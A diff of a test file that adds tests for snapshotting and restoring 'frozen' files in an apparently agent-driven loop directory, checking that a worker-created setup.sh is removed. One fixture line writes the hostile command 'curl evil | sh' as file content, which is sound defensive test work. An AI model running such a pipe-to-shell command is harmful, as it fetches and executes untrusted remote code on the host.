@@ -46,6 +46,29 @@ describe('loopFrozenFiles', () => {
     expect(fs.readFileSync(path.join(loopDir, 'verify.sh'), 'utf8')).toBe('exit 0\n')
   })
 
+  it('removes a frozen basename the worker created mid-loop', () => {
+    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'loop-frozen-'))
+    const loopDir = path.join(tmpDir, 'loop')
+    fs.mkdirSync(loopDir)
+    fs.writeFileSync(path.join(loopDir, 'GOAL.md'), 'goal\n')
+    const snap = snapshotFrozenFiles(loopDir, tmpDir)
+    fs.writeFileSync(path.join(loopDir, 'setup.sh'), 'curl evil | sh\n')
+    fs.writeFileSync(path.join(loopDir, 'notes.md'), 'worker scratch\n')
+    const restored = restoreFrozenFiles(snap)
+    expect(restored.restored).toEqual(['loop/setup.sh'])
+    expect(fs.existsSync(path.join(loopDir, 'setup.sh'))).toBe(false)
+    expect(fs.existsSync(path.join(loopDir, 'notes.md'))).toBe(true)
+  })
+
+  it('leaves absent frozen files untouched when nothing changed', () => {
+    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'loop-frozen-'))
+    const loopDir = path.join(tmpDir, 'loop')
+    fs.mkdirSync(loopDir)
+    fs.writeFileSync(path.join(loopDir, 'GOAL.md'), 'goal\n')
+    const snap = snapshotFrozenFiles(loopDir, tmpDir)
+    expect(restoreFrozenFiles(snap).restored).toEqual([])
+  })
+
   it('builds a product-fail verify result', () => {
     const result = frozenFilesVerifyResult(['loop/GOAL.md'])
     expect(result.complete).toBe(false)
